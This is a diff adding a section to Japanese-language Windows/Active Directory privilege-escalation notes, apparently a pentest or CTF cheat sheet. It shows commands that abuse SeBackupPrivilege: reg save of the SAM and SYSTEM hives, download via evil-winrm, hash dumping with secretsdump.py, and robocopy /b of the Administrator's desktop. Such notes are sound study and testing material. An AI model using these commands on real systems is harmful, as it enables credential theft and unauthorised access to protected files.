@@ -61,8 +61,17 @@ Active Directory Domain Servicesを実行しているっサーバーであり、
 `C:\Users\<ユーザー名>\.ssh\authorized_keys`
 
 ## 特権
+`SeBackupPrivilege` 通常Backup Operatorsグループのメンバーやシステムアカウントに付与される特権。Windowsの通常ACLを無視してアクセスできる。  
 ```bash
-SeBackupPrivilege # 通常Backup Operatorsグループのメンバーやシステムアカウントに付与される特権。Windowsの通常ACLを無視してアクセスできる。
+# レジストリからオフラインパスワードクラック
+reg save hklm\sam sam # SAMレジストリを保存
+reg save hklm\system system # SYSTEMレジストリを保存
+download sam # evil-winrmを使用したダウンロード
+download system # evil-winrmを使用したダウンロード
+secretsdump.py -sam sam -system system local # impacketのツール
+
+# robocopyを使用した管理者フォルダのコピー
+robocopy /b C:\Users\Administrator\Desktop\ C:\
 ```
 
 ## グループ
